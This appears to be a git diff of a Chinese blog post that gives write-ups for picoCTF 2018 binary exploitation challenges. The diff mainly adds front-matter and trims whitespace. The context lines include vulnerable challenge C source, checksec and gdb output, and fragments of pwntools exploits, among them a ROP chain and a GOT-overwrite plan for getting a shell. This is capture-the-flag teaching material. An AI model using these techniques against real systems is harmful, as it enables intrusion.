@@ -1,4 +1,19 @@
 ---
+title: picoCTFのpwn解析
+author: nepire
+avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
+authorLink: 'https://nepire.github.io/'
+authorAbout: 逐梦者
+authorDesc: 逐梦者
+categories: 技术
+comments: true
+date: 2019-11-05 11:50:36
+tags:
+keywords:
+description:
+photos:
+---
+---
 layout: post
 title:  "picoCTFのpwn解析"
 date:   2018-10-16 20:00:00
@@ -22,9 +37,9 @@ tags: WriteUp Pwn pico
 先检查一遍文件
 
 ```bash
-➜  bufferoverflow0 file vuln 
+➜  bufferoverflow0 file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped
-➜  bufferoverflow0 checksec vuln 
+➜  bufferoverflow0 checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -57,7 +72,7 @@ void vuln(char *input){
 }
 
 int main(int argc, char **argv){
-  
+
   FILE *f = fopen("flag.txt","r");
   if (f == NULL) {
     printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
@@ -65,10 +80,10 @@ int main(int argc, char **argv){
   }
   fgets(flag,FLAGSIZE_MAX,f);
   signal(SIGSEGV, sigsegv_handler);
-  
+
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
-  
+
   if (argc > 1) {
     vuln(argv[1]);
     printf("Thanks! Received: %s", argv[1]);
@@ -112,9 +127,9 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
 检查一遍文件
 
 ```bash
-➜  bufferoverflow1 file vuln 
+➜  bufferoverflow1 file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped
-➜  bufferoverflow1 checksec vuln 
+➜  bufferoverflow1 checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -159,7 +174,7 @@ void vuln(){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
@@ -199,9 +214,9 @@ picoCTF{addr3ss3s_ar3_3asy14941911}
 ### leak-me
 
 ```bash
-➜  leak-me file auth 
+➜  leak-me file auth
 auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped
-➜  leak-me checksec auth 
+➜  leak-me checksec auth
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -237,26 +252,26 @@ int flag() {
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   // Set the gid to the effective gid
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
-  
-  // real pw: 
+
+  // real pw:
   FILE *file;
   char password[64];
   char name[256];
   char password_input[64];
-  
+
   memset(password, 0, sizeof(password));
   memset(name, 0, sizeof(name));
   memset(password_input, 0, sizeof(password_input));
-  
+
   printf("What is your name?\n");
-  
+
   fgets(name, sizeof(name), stdin);
   char *end = strchr(name, '\n');    //name='a'*0x100  *end = NULL
-  if (end != NULL) 
+  if (end != NULL)
   {
     *end = '\x00';
   }
@@ -264,7 +279,7 @@ int main(int argc, char **argv){
   strcat(name, ",\nPlease Enter the Password.");
 
   file = fopen("password.txt", "r");
-  if (file == NULL) 
+  if (file == NULL)
   {
     printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
     exit(0);
@@ -277,12 +292,12 @@ int main(int argc, char **argv){
 
   fgets(password_input, sizeof(password_input), stdin);
   password_input[sizeof(password_input)] = '\x00';
-  
-  if (!strcmp(password_input, password)) 
+
+  if (!strcmp(password_input, password))
   {
     flag();
   }
-  else 
+  else
   {
     printf("Incorrect Password!\n");
   }
@@ -313,16 +328,16 @@ picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0}
 ### shellcode
 
 ```bash
-➜  shellcode file vuln 
+➜  shellcode file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped
-➜  shellcode checksec vuln 
+➜  shellcode checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments 
+    RWX:      Has RWX segments
 ```
 
 emmmm……防护机制全没开而且题目还叫shellcode，应该错不了是写shellcode了
@@ -345,7 +360,7 @@ void vuln(char *buf){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   gid_t gid = getegid();
@@ -357,9 +372,9 @@ int main(int argc, char **argv){
   vuln(buf);
 
   puts("Thanks! Executing now...");
-  
+
   ((void (*)())buf)();
-     
+
   return 0;
 }
 ```
@@ -392,9 +407,9 @@ picoCTF{shellc0de_w00h00_7f5a7309}
 ### bufer overflow2
 
 ```bash
-➜  bufferoverflow2 file vuln 
+➜  bufferoverflow2 file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped
-➜  bufferoverflow2 checksec vuln 
+➜  bufferoverflow2 checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -440,7 +455,7 @@ void vuln(){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
@@ -480,9 +495,9 @@ picoCTF{addr3ss3s_ar3_3asy30833fa1}
 ### got-2-learn-libc
 
 ```bash
-➜  got-2-learn-libc file vuln 
+➜  got-2-learn-libc file vuln
 vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped
-➜  got-2-learn-libc checksec vuln 
+➜  got-2-learn-libc checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -517,7 +532,7 @@ void vuln(){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   gid_t gid = getegid();
@@ -533,9 +548,9 @@ int main(int argc, char **argv){
   printf("useful_string: %p\n", useful_string);
 
   printf("\n");
-  
+
   vuln();
- 
+
   return 0;
 }
 ```
@@ -584,9 +599,9 @@ n.interactive()
 ### echooo
 
 ```bash
-➜  echooo file echo 
+➜  echooo file echo
 echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
-➜  echooo checksec echo 
+➜  echooo checksec echo
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -609,7 +624,7 @@ int main(int argc, char **argv){
   char buf[64];
   char flag[64];
   char *flag_ptr = flag;
-  
+
   // Set the gid to the effective gid
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
@@ -620,16 +635,16 @@ int main(int argc, char **argv){
   puts("Time to learn about Format Strings!");
   puts("We will evaluate any format string you give us with printf().");
   puts("See if you can get the flag!");
-  
+
   FILE *file = fopen("flag.txt", "r");
   if (file == NULL) {
     printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
     exit(0);
   }
-  
+
   fgets(flag, sizeof(flag), file);
-  
-  while(1) 
+
+  while(1)
   {
     printf("> ");
     fgets(buf, sizeof(buf), stdin);
@@ -703,9 +718,9 @@ picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
 ### authenticate
 
 ```bash
-➜  authenticate file auth 
+➜  authenticate file auth
 auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped
-➜  authenticate checksec auth 
+➜  authenticate checksec auth
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -755,16 +770,16 @@ int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
   char buf[64];
-  
+
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
-  
+
   printf("Would you like to read the flag? (yes/no)\n");
 
   fgets(buf, sizeof(buf), stdin);
-  
+
   if (strstr(buf, "no") != NULL) {
     printf("Okay, Exiting...\n");
     exit(1);
@@ -773,7 +788,7 @@ int main(int argc, char **argv) {
     puts("Received Unknown Input:\n");
     printf(buf);
   }
-  
+
   read_flag();
 
 }
@@ -811,9 +826,9 @@ picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
 ### got—shell?
 
 ```bash
-➜  got-shell file auth 
+➜  got-shell file auth
 auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped
-➜  got-shell checksec auth 
+➜  got-shell checksec auth
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -840,7 +855,7 @@ int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
   char buf[256];
-  
+
   unsigned int address;
   unsigned int value;
 
@@ -850,7 +865,7 @@ int main(int argc, char **argv) {
 
   sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
   puts(buf);
-  
+
   scanf("%x", &value);
 
   sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
@@ -860,7 +875,7 @@ int main(int argc, char **argv) {
 
   puts("Okay, exiting now...\n");
   exit(1);
-  
+
 }
 ```
 
@@ -896,9 +911,9 @@ picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
 ### rop chain
 
 ```bash
-➜  ropchain file rop 
+➜  ropchain file rop
 rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped
-➜  ropchain checksec rop 
+➜  ropchain checksec rop
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -949,7 +964,7 @@ void flag(unsigned int arg_check2) {
   }
 
   fgets(flag, sizeof(flag), file);
-  
+
   if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
     printf("%s", flag);
     return;
@@ -974,7 +989,7 @@ void vuln() {
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   gid_t gid = getegid();
@@ -1023,7 +1038,7 @@ picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
 ### buffer overflow 3
 
 ```bash
-➜  bufferoverflow3 file vuln 
+➜  bufferoverflow3 file vuln
 vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped
 ➜  bufferoverflow3 checksec vuln
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln'
@@ -1103,7 +1118,7 @@ void vuln(){
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   int i;
@@ -1203,9 +1218,9 @@ n.interactive()
 ### echo back
 
 ```bash
-➜  echo back file echoback 
+➜  echo back file echoback
 echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped
-➜  echo back checksec echoback 
+➜  echo back checksec echoback
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -1238,7 +1253,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 我们审计过程序后能得到的大致思路为先测出偏移，修改puts_got为vuln函数地址使得漏洞能多次触发，然后通过p32(system_got)+fmt_offset来得到system的真实地址，再把system的真实地址写入printf_got，然后在下一轮循环中输入'/bin/sh'后printf('/bin/sh')就相当执行了system('/bin/sh')来getshell
 
 ```bash
-➜  echo back ./echoback 
+➜  echo back ./echoback
 input your message:
 aaaa%7$x
 aaaa61616161
@@ -1285,9 +1300,9 @@ n.interactive()
 ### are you root?
 
 ```bash
-➜  are_you_root file auth 
+➜  are_you_root file auth
 auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped
-➜  are_you_root checksec auth 
+➜  are_you_root checksec auth
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1313,7 +1328,7 @@ typedef enum auth_level {
   ADMIN = 4,
   ROOT = 5
 } auth_level_t;
-  
+
 struct user {
   char *name;
   auth_level_t level;
@@ -1339,7 +1354,7 @@ login分支
       }
 
       user = (struct user *)malloc(sizeof(struct user));
-      if (user == NULL) 
+      if (user == NULL)
       {
         puts("malloc() returned NULL. Out of Memory\n");
         exit(-1);
@@ -1381,7 +1396,7 @@ gdb-peda$ x/8x 0x603410
 0x603420:	0x0000000000603440 <-*name	 0x0000000000000003 <-level
 0x603430:	0x0000000000000000			0x0000000000000021
 0x603440:	0x6161616161616161 <-name	0x6161616161616161 <-name
-gdb-peda$ 
+gdb-peda$
 0x603450:	0x0000000000000000			0x0000000000020bb1
 0x603460:	0x0000000000000000			0x0000000000000000
 0x603470:	0x0000000000000000			0x0000000000000000
@@ -1396,7 +1411,7 @@ gdb-peda$ x/8x 0x603410
 0x603420:	0x0000000000603440 <-*name	 0x0000000000000003
 0x603430:	0x0000000000000000			0x0000000000000021
 0x603440:	0x0000000000000000			0x6161616161616161 <- over_name
-gdb-peda$ 
+gdb-peda$
 0x603450:	0x0000000000000000			0x0000000000020bb1
 0x603460:	0x0000000000000000			0x0000000000000000
 0x603470:	0x0000000000000000			0x0000000000000000
@@ -1460,9 +1475,9 @@ picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a}
 ### can-you-gets-me
 
 ```bash
-➜  can-you-gets-me file gets 
+➜  can-you-gets-me file gets
 gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped
-➜  can-you-gets-me checksec gets 
+➜  can-you-gets-me checksec gets
 [*] '/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -1490,14 +1505,14 @@ void vuln() {
 int main(int argc, char **argv){
 
   setvbuf(stdout, NULL, _IONBF, 0);
-  
+
 
   // Set the gid to the effective gid
   // this prevents /bin/sh from dropping the privileges
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
   vuln();
-  
+
 }
 ```
 
@@ -1506,7 +1521,7 @@ int main(int argc, char **argv){
 ```bash
 ➜  can-you-gets-me ldd gets
 	不是动态可执行文件
-➜  can-you-gets-me 
+➜  can-you-gets-me
 ```
 
 emmmm，居然还真是静态库编译的那么我们试试用ropgadget的ropchain来构造ROP链玄学一键getshell
@@ -1571,7 +1586,7 @@ from pwn import*
 from struct import pack
 n = process('./gets')
 # Padding goes here
-p = 'a'*0x18 + 'aaaa'	    # buf 
+p = 'a'*0x18 + 'aaaa'	    # buf
 p += pack('<I', 0x0806f02a) # pop edx ; ret
 p += pack('<I', 0x080ea060) # @ .data
 p += pack('<I', 0x080b81c6) # pop eax ; ret
@@ -1616,4 +1631,3 @@ FLAG
 ```
 picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}
 ```
-
